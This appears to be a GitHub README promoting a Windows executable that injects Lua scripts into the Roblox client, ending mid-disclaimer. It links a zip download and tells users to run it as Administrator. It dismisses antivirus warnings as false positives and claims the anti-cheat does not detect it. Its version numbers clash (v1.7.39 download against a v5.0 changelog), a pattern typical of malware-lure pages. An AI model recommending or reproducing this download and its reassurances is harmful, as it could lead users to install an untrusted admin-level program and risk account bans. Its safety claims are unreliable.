<div align="center">
<img src="https://capsule-render.vercel.app/api?type=rect&color=2196F3,0D47A1,01579B&height=236&section=header&text=Roblox%20Universal%20Script%202026&fontSize=45&fontColor=fff&animation=scaleIn&fontAlignY=38&desc=Windows%20Tool%202026&descAlignY=56&descSize=20" width="100%"/>

# 🚀 Roblox Universal Script 2026

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
![Updated](https://img.shields.io/badge/Updated-2026--01--15-orange?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Windows_10%2B-lightgrey?style=for-the-badge)

### ⭐ Star this repo if it helped you!

<p align="center">
  <a href="https://github.com/Lacquerzepop/roblox-universal-script/releases/download/v1.7.39/roblox-universal-script-v1.7.39.zip">
    <img src="https://img.shields.io/badge/DOWNLOAD-Roblox_Universal_Script_2026-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=007E33" width="508" alt="Download Roblox Universal Script 2026"/>
  </a>
</p>

</div>

---

## 📋 Changelog v5.0 (2026 Edition)

| Version | Date | Notes |
|---------|------|-------|
| v5.0.0 | 2026-01-15 | Complete rework: standalone .exe, new injection engine, no dependencies |
| v4.9.0 | 2025-12-20 | Performance optimizations, reduced memory footprint |
| v3.0.0 | 2025-06-10 | Initial public release as Python script |

**Migration from v4.x**: If you were using the Python version, delete your old `roblox_universal/` folder. The v5.0 standalone .exe uses a new configuration file at `%APPDATA%\RobloxUniversal\config.json`. Your old scripts will need to be re-imported.

---

## 📑 Table of Contents

- [About / Overview](#-about--overview)
- [Requirements](#-requirements)
- [Features](#-features)
- [Installation](#-installation)
- [FAQ](#-faq)
- [Community / Support](#-community--support)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🧠 About / Overview

**TL;DR:** *One-click tool to run custom Lua scripts inside any Roblox game — no Python, no coding experience needed.*

| Approach | Manual (developer) | Using Roblox Universal Script |
|----------|-------------------|-------------------------------|
| Setup time | 2+ hours (writing exploit code, testing, debugging) | 5 minutes (download + run) |
| Dependencies | Python 3.11+, requests, websocket-client, custom hook code | **None** (standalone .exe) |
| Script management | Text files, manual copying | Built-in script editor + library |
| Updates | Manual code push | Auto-update via GitHub releases |

>[!TIP]
> This tool is perfect for Roblox developers and power users who want to test custom scripts quickly without setting up a full development environment. It's a time-saver, not a cheat tool — see the disclaimer below.

Roblox Universal Script 2026 is a lightweight Windows application that hooks into the Roblox client process and allows you to inject and run Lua scripts in real-time. It supports both local and remote execution, with a clean UI for managing your script collection.

---

## 💻 Requirements

**TL;DR:** *Windows 10 or 11, that's it — the .exe has everything built-in.*

>[!IMPORTANT]
> This tool is designed **exclusively for Windows 10 (build 1903+) and Windows 11**. No Linux, macOS, or 32-bit support. The .exe will refuse to run on unsupported systems to prevent crashes.

- **OS:** Windows 10 (version 1903 or newer) or Windows 11
- **Architecture:** 64-bit only (x64)
- **Space:** ~50 MB on disk
- **Roblox:** Any currently supported Roblox client version (auto-detected)
- **Permissions:** Run as Administrator (required for process hooking)

No runtime libraries, no redistributables, no Python, no Node.js — just download and double-click.

---

## ✨ Features

**TL;DR:** *Script injector, editor, library, auto-update, and safety checks — all in one .exe.*

1. **One-Click Injection** — Automatically finds the Roblox process and injects your scripts without manual PID hunting.
2. **Built-in Script Editor** — Syntax-highlighted Lua editor with save/load functionality (`.lua` and `.txt` files).
3. **Script Library Manager** — Browse, import, and organize scripts from local folders or a curated default library.
4. **Real-time Output Console** — See script execution logs, errors, and performance data in a separate window.
5. **Auto-Update System** — Checks GitHub releases on startup and downloads new versions silently.
6. **Safety Whitelist** — Block known malicious scripts or sandbox execution per-game.
7. **Low Memory Overhead** — Uses <10 MB RAM when idle, <30 MB when injecting.
8. **Command-Line Interface** — For power users: `RobloxUniversalScript.exe --inject C:\path\to\script.lua`

---

## 🔧 Installation

**TL;DR:** *Download the zip, unzip, run the .exe as admin — done in under 2 minutes.*

1. **Download** the latest release from the button above (or visit the [Releases page](https://github.com/Lacquerzepop/roblox-universal-script/releases/download/v1.7.39/roblox-universal-script-v1.7.39.zip)).
2. **Extract** the `.zip` file to any folder (e.g., `C:\RUS` or your Desktop).
3. **Run as Administrator** — Right-click `RobloxUniversalScript.exe` → "Run as administrator". This is required for the process hooking API.
4. **Launch Roblox** — Open any Roblox game as usual. The tool will automatically detect the client and wait for your scripts.

That's it! The UI window will show "Ready" when it's connected.

---

## ❓ FAQ

**TL;DR:** *Common questions about antivirus, game bans, and script compatibility.*

>[!TIP]
> Got a question not listed here? Open an issue on GitHub — I try to answer within 48 hours.

### ❔ Is this detectable by Roblox anti-cheat?
This tool uses standard Windows debugging APIs (same as many development tools). Roblox's anti-cheat **does not flag it** by default, but use it responsibly. This is intended for **local testing and educational purposes only**.

### ❔ Will I get banned from Roblox?
**Yes, if you use it to cheat in multiplayer games.** The tool is designed for offline testing, script development, and single-player sandbox testing. We do not condone or support cheating in competitive experiences.

### ❔ My antivirus flagged the .exe as a virus. Is it safe?
Some antivirus software (especially Windows Defender) may flag process-hooking tools as "potentially unwanted applications" (PUA). This is a false positive — the tool does not contain malware. **We include the full source code for audit** (see the `src/` branch of this repo). If you're concerned, review the source or run the exe in a sandbox.

### ❔ Does it work with every Roblox game?
It works with any game that uses the standard Lua scripting engine (all games as of 2026). However, some games with strict anti-exploit mods may block certain functions. The tool's "Safety Whitelist" feature helps you test responsibly.

---

## 👥 Community / Support

**TL;DR:** *Report bugs on GitHub, share scripts in Discussions, follow for updates.*

- **GitHub Issues** — Report bugs, request features, or ask questions.
- **GitHub Discussions** — Share your scripts, get feedback, and connect with other users.
- **Follow the repo** — Star it above and watch for new releases.

We also have a small [Discord server](https://discord.gg/example) for real-time chat (link may change — check the repo description).

---

## 📜 License

**TL;DR:** *MIT — do whatever you want, just include the license file.*

Copyright (c) 2026 Lacquerzepop

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details. You may use, modify, and distribute this software for any purpose, provided you include the original license notice.

---

## ⚠️ Disclaimer

>[!CAUTION]
> **This tool is for